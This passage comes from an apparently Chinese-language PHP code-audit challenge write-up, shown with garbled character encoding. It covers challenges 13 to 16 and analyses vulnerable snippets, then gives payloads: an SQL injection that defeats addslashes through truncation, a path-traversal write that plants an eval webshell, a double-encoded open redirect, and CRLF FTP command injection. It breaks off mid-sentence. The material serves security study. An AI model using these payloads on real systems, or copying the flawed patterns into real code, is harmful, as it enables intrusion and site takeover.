class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line">        $pass = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;password);</span><br><span class="line"></span><br><span class="line">        $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">            -&gt;select(<span class="string">"COUNT(p)"</span>)</span><br><span class="line">            -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">            -&gt;where(<span class="string">"user = '$user' AND password = '$pass'"</span>);</span><br><span class="line">        $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">        <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input, $length = <span class="number">20</span>)</span> </span>&#123;</span><br><span class="line">        $input = addslashes($input);</span><br><span class="line">        <span class="keyword">if</span> (strlen($input) &gt; $length) &#123;</span><br><span class="line">            $input = substr($input, <span class="number">0</span>, $length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> LoginManager($_POST[<span class="string">'user'</span>], $_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-12"><a href="#åˆ†æ-12" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ³¨æ„åˆ°ä¸¤ä¸ªå‚æ•°éƒ½è¢« <code>addslashes()</code> è½¬ä¹‰ï¼Œè€Œä¸”å°†è¢«æˆªæ–­ã€‚</p><p>å¦‚æœæ²¡æœ‰è¿™ä¸ªæˆªæ–­æ“ä½œï¼Œæœ‰ <code>addslashes()</code> åŠ æŒè¿˜æ˜¯ä¼šå®‰å…¨å¾ˆå¤šï¼Œæœ‰äº†æˆªæ–­å°±å¯ä»¥æäº‹æƒ…äº†ï¼Œâ€œé€ƒé€¸â€ä¸€ä¸ª <code>\</code> å‡ºæ¥å°† <code>â€˜</code> åƒæ‰ã€‚</p><h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="number">1234567890123456789</span>\&amp;passwd=<span class="keyword">or</span> <span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å½¢æˆçš„ <code>sql</code> è¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where user = '1234567890123456789\' AND password = 'or 1<span class="comment">#'</span></span><br></pre></td></tr></table></figure><h2 id="14-Snowman"><a href="#14-Snowman" class="headerlink" title="14 - Snowman"></a>14 - Snowman</h2><blockquote><p>å˜é‡è¦†ç›–</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Carrot</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> EXTERNAL_DIRECTORY = <span class="string">'/tmp/'</span>;</span><br><span class="line">    <span class="keyword">private</span> $id;</span><br><span class="line">    <span class="keyword">private</span> $lost = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> $bought = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = rand(<span class="number">1</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($input <span class="keyword">as</span> $field =&gt; $count) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$field = $count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        file_put_contents(</span><br><span class="line">            <span class="keyword">self</span>::EXTERNAL_DIRECTORY . <span class="keyword">$this</span>-&gt;id,</span><br><span class="line">            var_export(get_object_vars(<span class="keyword">$this</span>), <span class="keyword">true</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$carrot = <span class="keyword">new</span> Carrot($_GET);</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-13"><a href="#åˆ†æ-13" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™é‡Œæœ‰ä¸€ä¸ªæ˜æ˜¾çš„å˜é‡è¦†ç›–æ¼æ´ï¼Œ<code>id</code> å°½ç®¡è¢«èµ‹ä¸Šäº†éšæœºæ•°ï¼Œä½†å®é™…ä¸Šè¿˜æ˜¯å¯æ§çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents ( string $filename , mixed $data [, int $flags = <span class="number">0</span> [, resource $context ]] ) : int</span><br></pre></td></tr></table></figure><blockquote><p>PHP æœ‰ä¸ªå¥½ç©çš„åœ°æ–¹ï¼Œèƒ½ä¼  <code>$filename</code> çš„åœ°æ–¹ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç”¨ PHP ä¼ªåè®®æµã€‚</p><p>å¯æƒœè¿™é‡Œçš„ EXTERNAL_DIRECTORY ä¸å¯æ§ï¼Œä¸å¥½ç”¨å…¶ä»–æŠ€å·§äº†ã€‚</p><p>æƒ³æ·±å…¥äº†è§£å¯ä»¥å‚è€ƒ ph å¸ˆå‚…çš„è¿™ç¯‡æ–‡ç« ï¼Œ<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a></p></blockquote><p><code>get_object_vars($this)</code> æ²¡æœ‰é‡‡å–ä»»ä½•è¿‡æ»¤ï¼Œå¯ç›´æ¥å†™å…¥ <code>webshell</code>ã€‚</p><h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">id=../../<span class="keyword">var</span>/www/html/shell.php&amp;t=<span class="meta">&lt;?php</span>%<span class="number">20</span><span class="keyword">eval</span>($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// print_r(var_export(get_object_vars($this), true));   </span></span><br><span class="line"><span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'id'</span> =&gt; <span class="string">'../../var/www/html/shell.php'</span>,</span><br><span class="line">  <span class="string">'lost'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">  <span class="string">'bought'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">  <span class="string">'t'</span> =&gt; <span class="string">'&lt;?php eval($_GET[1])?&gt;'</span>,</span><br><span class="line">)</span><br><span class="line">    </span><br><span class="line"><span class="comment">// echo self::EXTERNAL_DIRECTORY . $this-&gt;id;</span></span><br><span class="line">/tmp/../../<span class="keyword">var</span>/www/html/test/shell.php</span><br></pre></td></tr></table></figure><p><strong>å˜ä¸€å˜</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;$field = $count++;  -â€“&gt;  <span class="keyword">$this</span>-&gt;$field = ++$count;</span><br></pre></td></tr></table></figure><p>php æœ‰ä¸ªå¾ˆæœ‰æ„æ€çš„ç‰¹æ€§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $s = <span class="string">'1'</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> ++$s;  <span class="comment">// 2</span></span><br><span class="line">php &gt; $s = <span class="string">'a'</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> ++$s;  <span class="comment">// b</span></span><br><span class="line">php &gt; $s = <span class="string">'abc'</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> ++$s;  <span class="comment">// abd</span></span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™åªéœ€è¦ç¨å¾®æ”¹ä¸‹å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=../../<span class="keyword">var</span>/www/html/shell.pho&amp;t=<span class="meta">&lt;?php</span>%<span class="number">20</span><span class="keyword">eval</span>($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="15-Sleigh-Ride"><a href="#15-Sleigh-Ride" class="headerlink" title="15 - Sleigh Ride"></a>15 - Sleigh Ride</h2><blockquote><p>$_SERVER[â€˜PHP_SELFâ€™]</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Redirect</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $websiteHost = <span class="string">'www.example.com'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setHeaders</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">        $url = urldecode($url);</span><br><span class="line">        header(<span class="string">"Location: $url"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">startRedirect</span><span class="params">($params)</span> </span>&#123;</span><br><span class="line">        $parts = explode(<span class="string">'/'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>]);</span><br><span class="line">        $baseFile = end($parts);</span><br><span class="line">        $url = sprintf(</span><br><span class="line">            <span class="string">"%s?%s"</span>,</span><br><span class="line">            $baseFile,</span><br><span class="line">            http_build_query($params)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setHeaders($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'redirect'</span>]) &#123;</span><br><span class="line">    (<span class="keyword">new</span> Redirect())-&gt;startRedirect($_GET[<span class="string">'params'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç²—ä¸€çœ‹ï¼Œæœ‰ä¸€ä¸ª <code>Redirect</code> çš„ç±»ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯ä»»æ„ <code>URL</code> è·³è½¬ã€‚</p><h3 id="åˆ†æ-14"><a href="#åˆ†æ-14" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">'PHP_SELF'</span>]  <span class="comment">// å½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å</span></span><br><span class="line">http:<span class="comment">//example.com/test.php/foo.bar</span></span><br><span class="line">--&gt; /test.php/foo.bar</span><br><span class="line"></span><br><span class="line">explode ( string $delimiter , string $string [, int $limit ] ) : <span class="keyword">array</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pizza  = <span class="string">"piece1 piece2 piece3 piece4 piece5 piece6"</span>;</span><br><span class="line">$pieces = explode(<span class="string">" "</span>, $pizza);</span><br><span class="line"><span class="keyword">echo</span> $pieces[<span class="number">0</span>]; <span class="comment">// piece1</span></span><br><span class="line"><span class="keyword">echo</span> $pieces[<span class="number">1</span>]; <span class="comment">// piece2    </span></span><br><span class="line"></span><br><span class="line">end ( <span class="keyword">array</span> &amp;$array ) : mixed</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fruits = <span class="keyword">array</span>(<span class="string">'apple'</span>, <span class="string">'banana'</span>, <span class="string">'cranberry'</span>);</span><br><span class="line"><span class="keyword">echo</span> end($fruits); <span class="comment">// cranberry</span></span><br><span class="line"></span><br><span class="line">http_build_query ( mixed $query_data [, string $numeric_prefix [, string $arg_separator [, int $enc_type = PHP_QUERY_RFC1738 ]]] ) : string</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = <span class="keyword">array</span>(<span class="string">'foo'</span>=&gt;<span class="string">'bar'</span>,</span><br><span class="line">              <span class="string">'baz'</span>=&gt;<span class="string">'boom'</span>,</span><br><span class="line">              <span class="string">'cow'</span>=&gt;<span class="string">'milk'</span>,</span><br><span class="line">              <span class="string">'php'</span>=&gt;<span class="string">'hypertext processor'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> http_build_query($data) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// foo=bar&amp;baz=boom&amp;cow=milk&amp;php=hypertext+processor</span></span><br><span class="line"><span class="keyword">echo</span> http_build_query($data, <span class="string">''</span>, <span class="string">'&amp;amp;'</span>);    </span><br><span class="line"><span class="comment">// myvar_0=foo&amp;myvar_1=bar&amp;myvar_2=baz&amp;myvar_3=boom&amp;cow=milk&amp;php=hypertext+processor</span></span><br></pre></td></tr></table></figure><p>å…¶æœ¬æ„åº”è¯¥æ˜¯å®ç°ç«™å†…è·³è½¬ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥é€ æˆäº†æ¼æ´ã€‚</p><p>æ­¤æ¼æ´å¯è¢«æ‹¿æ¥æ„é€ é’“é±¼é¡µé¢ï¼Œæ¥è¿›è¡Œæ¬ºéª—ï¼›æŸäº›ä¾èµ– <code>referer</code> æ ¡éªŒçš„å®‰å…¨è§£å†³æ–¹æ¡ˆä¹Ÿä¼šå¤±æ•ˆã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœæœ‰æäº¤æœ¬ç«™ bug çš„çª—å£ï¼Œè¿˜å¯ä»¥ç»“åˆä¸€äº› <code>xss</code> ç›²æ‰“ç®¡ç†å‘˜ <code>cookie</code>ã€‚</p><h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/target.com?redirect=<span class="number">1</span>&amp;params[abc]=<span class="number">123</span></span><br><span class="line">URL --&gt; target.com?abc=<span class="number">123</span>  <span class="comment">// ä»ç„¶åœ¨ç«™å†…è·³è½¬ï¼Œéœ€è¦æ·»åŠ ä¸€ä¸ª http://</span></span><br><span class="line">å‰é¢åˆæ˜¯ç”¨ / åˆ†å‰²çš„ï¼Œå¦‚æœç›´æ¥åŠ å…¥å°†å¤±æ•ˆï¼Œæ³¨æ„åˆ° urldecode()ï¼Œæ‰€ä»¥è¿™é‡Œå¯ç”¨ url äºŒæ¬¡ç¼–ç ç»•è¿‡</span><br><span class="line"><span class="comment">//  --&gt;  %2f%2f  --&gt; %25%32%66%25%32%66</span></span><br><span class="line">æœ€ç»ˆ payload  --&gt; index.php/http:%<span class="number">252</span>f%<span class="number">252</span>fbaidu.com?redirect=<span class="number">1</span>&amp;params[abc]=<span class="number">123</span></span><br></pre></td></tr></table></figure><h2 id="16-Poem"><a href="#16-Poem" class="headerlink" title="16 - Poem"></a>16 - Poem</h2><blockquote><p>$_REQUESTS</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTP</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($host, $port, $user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sock = fsockopen($host, $port);  <span class="comment">// è¿”å›æ–‡ä»¶æŒ‡é’ˆï¼Œæ–‡ä»¶æ“ä½œç›¸å…³å‡½æ•°éƒ½èƒ½ç”¨</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;login($user, $pass);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cleanInput();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mode($_REQUEST[<span class="string">'mode'</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;send($_FILES[<span class="string">'file'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanInput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $_GET = array_map(<span class="string">'intval'</span>, $_GET);</span><br><span class="line">        $_POST = array_map(<span class="string">'intval'</span>, $_POST);</span><br><span class="line">        $_COOKIE = array_map(<span class="string">'intval'</span>, $_COOKIE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"USER "</span> . $username . <span class="string">"\n"</span>);</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"PASS "</span> . $password . <span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mode</span><span class="params">($mode)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($mode == <span class="number">1</span> || $mode == <span class="number">2</span> || $mode == <span class="number">3</span>) &#123;</span><br><span class="line">            fputs(<span class="keyword">$this</span>-&gt;sock, <span class="string">"MODE $mode\n"</span>);  <span class="comment">// fputs æ˜¯ fwrite åˆ«å</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        fputs(<span class="keyword">$this</span>-&gt;sock, $data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FTP(<span class="string">'localhost'</span>, <span class="number">21</span>, <span class="string">'user'</span>, <span class="string">'password'</span>);</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-15"><a href="#åˆ†æ-15" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç»™çš„æºç æ˜¯ä¸€ä¸ª <code>FTP</code> æ“ä½œç±»ï¼Œå¯èƒ½åˆæ˜¯æ–‡ä»¶ä¸Šä¼ ã€‚</p><p>ä¸ç†Ÿæ‚‰ <code>fsockopen</code> çš„ï¼Œå¯ä»¥çœ‹çœ‹ <a href="http://www.manongjc.com/article/1463.html" target="_blank" rel="noopener">php fsockopenä½¿ç”¨æ–¹æ³•å’Œå®ä¾‹è®²è§£</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸ºæ•°ç»„æ¯ä¸€ä¸ªå…ƒç´ éƒ½åº”ç”¨å›è°ƒå‡½æ•°ï¼Œç±»ä¼¼ map()</span></span><br><span class="line">array_map ( callable $callback , <span class="keyword">array</span> $array1 [, <span class="keyword">array</span> $... ] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>è¿™ç”¨åˆ°äº†ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„è¶…çº§å…¨å±€å˜é‡â€”â€” <code>$_REQUEST</code>ï¼Œå¼€å‘è¿‡ç¨‹ä¸­å°½é‡ä¸è¦ç”¨ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸‹æ‰‹å†Œã€‚</p><blockquote><p>é»˜è®¤æƒ…å†µä¸‹åŒ…å«äº† <a href="http://php.net/manual/zh/reserved.variables.get.php" target="_blank" rel="noopener">$_GET</a>ï¼Œ<a href="http://php.net/manual/zh/reserved.variables.post.php" target="_blank" rel="noopener">$_POST</a> å’Œ <a href="http://php.net/manual/zh/reserved.variables.cookies.php" target="_blank" rel="noopener">$_COOKIE</a> çš„æ•°ç»„ã€‚</p><p>ç”±äº $_REQUEST ä¸­çš„å˜é‡é€šè¿‡ GETï¼ŒPOST å’Œ COOKIE è¾“å…¥æœºåˆ¶ä¼ é€’ç»™è„šæœ¬æ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥è¢«è¿œç¨‹ç”¨æˆ·ç¯¡æ”¹è€Œå¹¶ä¸å¯ä¿¡ã€‚è¿™ä¸ªæ•°ç»„çš„é¡¹ç›®åŠå…¶é¡ºåºä¾èµ–äº PHP çš„ <a href="http://php.net/manual/zh/ini.core.php#ini.variables-order" target="_blank" rel="noopener">variables_order</a> æŒ‡ä»¤çš„é…ç½®ã€‚</p></blockquote><p>ä¸ºä»€ä¹ˆä¼šè¯´ä¸å¯ä¿¡å‘¢ï¼Ÿ<code>$_REQUEST</code> æ˜¯ç›´æ¥ä» <code>GET, POST, COOKIE</code> ä¸­å–å€¼ï¼Œè€Œä¸æ˜¯å¼•ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿<code>GET, POST, COOKIE</code> çš„å€¼åœ¨åç»­å‘ç”Ÿäº†å˜åŒ–ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ° <code>$_REQUEST</code> ä¸­çš„å€¼ï¼Œç›¸å½“äºå¤åˆ¶äº†ä¸€ä»½æœ€åˆçš„å€¼ã€‚</p><p>è€Œä¸Šé¢çš„ <code>cleanInput()</code> åªæ˜¯å°† <code>GET, POST, COOKIE</code> å¤„ç†äº†ä¸€ä¸‹ï¼Œä½†æ˜¯  <code>$_REQUEST</code> ä¾ç„¶ä¸ä¼šå—å½±å“ã€‚</p><p><strong>åšä¸ªå°å®éªŒ</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET = array_map(<span class="string">'intval'</span>, $_GET);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// ?hhh=123test ç»“æœå¦‚ä¸‹</span></span><br><span class="line">print_r($_GET);</span><br><span class="line">print_r($_REQUEST);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Array (</span></span><br><span class="line"><span class="comment">    [hhh] =&gt; 123</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">Array (</span></span><br><span class="line"><span class="comment">    [hhh] =&gt; 123test</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªå°ç‚¹ï¼Œè¿™é‡Œç”¨çš„æ˜¯ <code>==</code> ï¼Œä¼šè‡ªåŠ¨è¿›è¡Œç±»å‹è½¬æ¢ï¼Œæ‰€ä»¥è½»æ¾ç»•è¿‡ï¼Œå®‰å…¨ç¼–ç é—®é¢˜ã€‚</p><p><code>fwrite()</code> èƒ½ä¸èƒ½è¿›è¡Œæ–‡ä»¶å†™å…¥ï¼Ÿ<code>ftp</code> åè®®è¿˜èƒ½è¿›è¡Œå“ªäº›éªšæ“ä½œï¼Ÿ</p><p>å¸¦ç€è¿™ä¸¤ä¸ªé—®é¢˜å†åšåšå®éªŒï¼Œä¸è¿‡è¿™é‡åˆ°äº†ä¸€ä¸ªæ–°é—®é¢˜ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fwrite ( resource $handle , string $string [, int $length ] ) : int</span><br><span class="line">fputs(<span class="keyword">$this</span>-&gt;sock, $data);  </span><br><span class="line"><span class="comment">// ä¼ å…¥çš„ $data åº”è¯¥ä¸º string ç±»å‹ï¼Œä½†è¿™é‡Œä¼ çš„æ˜¯æ•°ç»„ï¼Œèƒ½è¡Œï¼Ÿ</span></span><br><span class="line"><span class="comment">// ç»è¿‡å®éªŒï¼Œä¼ æ•°ç»„è¿›å»çš„åæœå°±æ˜¯ä»€ä¹ˆä¹Ÿå†™ä¸è¿›å»ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥è‡ªå·±è¯•è¯•ã€‚</span></span><br><span class="line"><span class="comment">// æ‰€ä»¥ä¼ å…¥çš„ $_FILES['file'] æœ¬æ„æ˜¯å•¥ï¼Ÿ</span></span><br><span class="line"><span class="comment">// å¦å¤– ftp mode æœ‰ 1ã€2ã€3ï¼Ÿ</span></span><br></pre></td></tr></table></figure><p>å…ˆå¼€å¯ <code>nc</code> è¿›è¡Œç›‘å¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvvkp 8080</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ <code>$_FILES[&#39;file&#39;]</code> æ²¡å¤šå¤§æ„ä¹‰ï¼Œä¼ ä¸è¿‡å»ï¼Œæ‰€ä»¥è¡¨å•ä¹Ÿçœäº†ï¼Œç›´æ¥åœ¨æµè§ˆå™¨å‘èµ·è¯·æ±‚ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1bj3upo1vj20ms08t74v.jpg" alt></p><p>å¯ä»¥çœ‹åˆ° <code>mode</code> é‚£æˆåŠŸç»•è¿‡ï¼Œä½†æ˜¯ç»•è¿‡äº†åˆèƒ½å¹²å•¥å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯ä»»æ„ <code>ftp</code> æŒ‡ä»¤æ‰§è¡Œï¼Œåªéœ€è¦åŠ ä¸ª <code>%0a</code> æ¢è¡Œå’Œ <code>%0d</code> å›è½¦å³å¯å®ç°å‘½ä»¤ï¼ˆftpï¼‰æ³¨å…¥ã€‚</p><h3 id="payload-14"><a href="#payload-14" class="headerlink" title="payload"></a>payload</h3><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ <code>ftp</code> 